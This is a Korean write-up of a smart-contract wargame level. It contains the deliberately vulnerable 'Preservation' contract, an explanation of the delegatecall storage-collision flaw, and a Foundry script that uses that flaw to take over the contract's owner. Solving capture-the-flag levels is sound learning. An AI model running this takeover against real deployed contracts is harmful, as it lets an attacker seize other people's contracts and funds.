# 지문

이 컨트랙트는 서로 다른 두 개의 시간대를 위해 두 가지 시간을 저장하기 위해 라이브러리를 사용합니다. 생성자는 저장할 각각의 시간에 대해 라이브러리 인스턴스를 두 개 생성합니다.

이 레벨의 목표는 할당받은 인스턴스의 소유권을 당신이 획득하는 것입니다.

도움이 될 만한 것들:

* Solidity 문서에서 저수준 함수인 `delegatecall`을 살펴보세요. 어떻게 동작하는지, 온체인 라이브러리에 연산을 위임하는 데 어떻게 사용되는지, 그리고 실행 스코프에 어떤 영향을 미치는지 이해하세요.
* `delegatecall`이 컨텍스트를 보존한다는 것이 무엇을 의미하는지 이해하세요.
* 스토리지 변수들이 어떻게 저장되고 접근되는지 이해하세요.
* 서로 다른 데이터 타입 간의 캐스팅이 어떻게 동작하는지 이해하세요.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

# 풀이 

전형적인 Storage collision 문제.

delegatecall로 logic을 `LibraryContract`로부터 가져오는데 `setTime`함수는 Storage slot 0에 해당되는 곳에 값을 write하는 함수임.
근데 이걸 `Preservation` contract의 context에서 실행하면 `Preservation` contract의 Storage slot 0에 해당하는 `timeZone1Library`값이 overwrite됨.

그렇게 되면 공격자의 입장에서 `LibraryContract`가 아닌 임의의 Contract로부터 Logic을 가져와서 `Preservation` contract의 context위에서 실행할 수 있음

위와 같은 원리로 owner까지 덮어쓰면됨.


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

contract CollisionHelper {
    address one;
    address two;
    address target;

    function setTime(uint256 _time) public {
        target = address(uint160(_time));
    }
}
contract SolveScript is Script {
    address public target = 0x4AE5AF759E17599107c1C688bfaCF6131C376D51;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        CollisionHelper helper = new CollisionHelper();
        console.log("owner : %s", ITarget(target).owner());
        ITarget(target).setFirstTime(uint256(uint160(address(helper))));
        ITarget(target).setFirstTime(uint256(uint160(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)));
        console.log("owner after poc : %s", ITarget(target).owner());
        vm.stopBroadcast();
    }
}

```